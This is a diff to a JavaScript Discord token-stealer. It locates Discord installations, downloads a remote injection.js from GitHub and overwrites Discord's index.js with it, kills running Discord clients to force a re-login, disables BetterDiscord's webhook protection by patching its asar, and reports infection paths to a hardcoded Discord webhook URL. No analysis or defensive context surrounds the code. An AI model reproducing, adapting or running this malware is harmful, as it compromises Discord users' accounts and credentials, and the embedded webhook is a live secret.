@@ -1,22 +1,28 @@
-const glob = require("glob");
+var glob = require("glob");
 const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "https://discordapp.com/api/webhooks/965478614189621269/SUBD26fC7ZGk4Y2TMHZ2E1L-0fUpa01dx1LYgiCo2COJWf-ZW5JlsbWSA4mt5N72W-_Q"
+
 const config = {
     "logout": "instant",
     "inject-notify": "true",
     "logout-notify": "true",
     "init-notify":"true",
-    "embed-color": "BLACK",
-    "disable-qr-code": "FALSE"
+    "embed-color": 0000000,
+    "disable-qr-code": "true"
 }
-let LOCAL = process.env.LOCALAPPDATA
-let discords = [];
-let injectPath = [];
-let runningDiscords = [];
+
+
+
+
+var LOCAL = process.env.LOCALAPPDATA
+var discords = [];
+var injectPath = [];
+var runningDiscords = [];
+
 
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
@@ -31,10 +37,9 @@ discords.forEach(function(file) {
     glob.sync(pattern).map(file => {
         injectPath.push(file)
     })
+    
 });
-
 listDiscords();
-
 function Infect() {
     https.get('https://raw.githubusercontent.com/zpiratee/test/main/injection.js', (resp) => {
         let data = '';
@@ -47,16 +52,15 @@ function Infect() {
                     encoding: 'utf8',
                     flag: 'w'
                 });
-
                 if (config["init-notify"] == "true") {
                     let init = file.replace("index.js", "init")
                     if (!fs.existsSync(init)) {
                         fs.mkdirSync(init, 0744)
                     }
                 }
-
                 if ( config.logout != "false" ) {
-                    let folder = file.replace("index.js", "SpreadingChaos")
+
+                    let folder = file.replace("index.js", "SpreadingChaosBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -67,19 +71,34 @@ function Infect() {
                     }
                 }
             })
+            
         });
     }).on("error", (err) => {
         console.log(err);
     });
 };
 
-function listDiscords() {
-    exec('tasklist', function(err, stdout, stderr) {
-        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
-        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
-        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
-        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
 
+function listDiscords() {
+    exec('tasklist', function(err,stdout, stderr) {
+
+        
+        if (stdout.includes("Discord.exe")) {
+
+            runningDiscords.push("discord")
+        }
+        if (stdout.includes("DiscordCanary.exe")) {
+
+            runningDiscords.push("discordcanary")
+        }
+        if (stdout.includes("DiscordDevelopment.exe")) {
+
+            runningDiscords.push("discorddevelopment")
+        }
+        if (stdout.includes("DiscordPTB.exe")) {
+
+            runningDiscords.push("discordptb")
+        };
         if (config.logout == "instant") {
             killDiscord();
         } else {
@@ -90,6 +109,9 @@ function listDiscords() {
             pwnBetterDiscord()
         }
     })
+
+
+   
 };
 
 function killDiscord() {
@@ -98,9 +120,8 @@ function killDiscord() {
             if (err) {
               return;
             }
-        });
+          });
     });
-
     if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
         injectNotify();
     }
@@ -116,31 +137,33 @@ function startDiscord() {
             if (err) {
               return;
             }
-        });
+          });
     });
 };
-
 function pwnBetterDiscord() {
-    let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
-        let x = fs.readFileSync(dir)
+        var x = fs.readFileSync(dir)
         fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "zpirate"))
+    } else {
+        return;
     }
 
-    return;
 }
 
+
 function injectNotify() {
-    let fields = [];
+    var fields = [];
     injectPath.forEach( path => {
-        let c = {
+        var c = {
             name: ":syringe: Inject Path",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
         fields.push(c)
     })
-    axios.post(webhook, {
+    axios
+	.post(webhook, {
         "content": null,
         "embeds": [
           {
@@ -161,4 +184,5 @@ function injectNotify() {
 	.catch(error => {
 
     })
+
 }
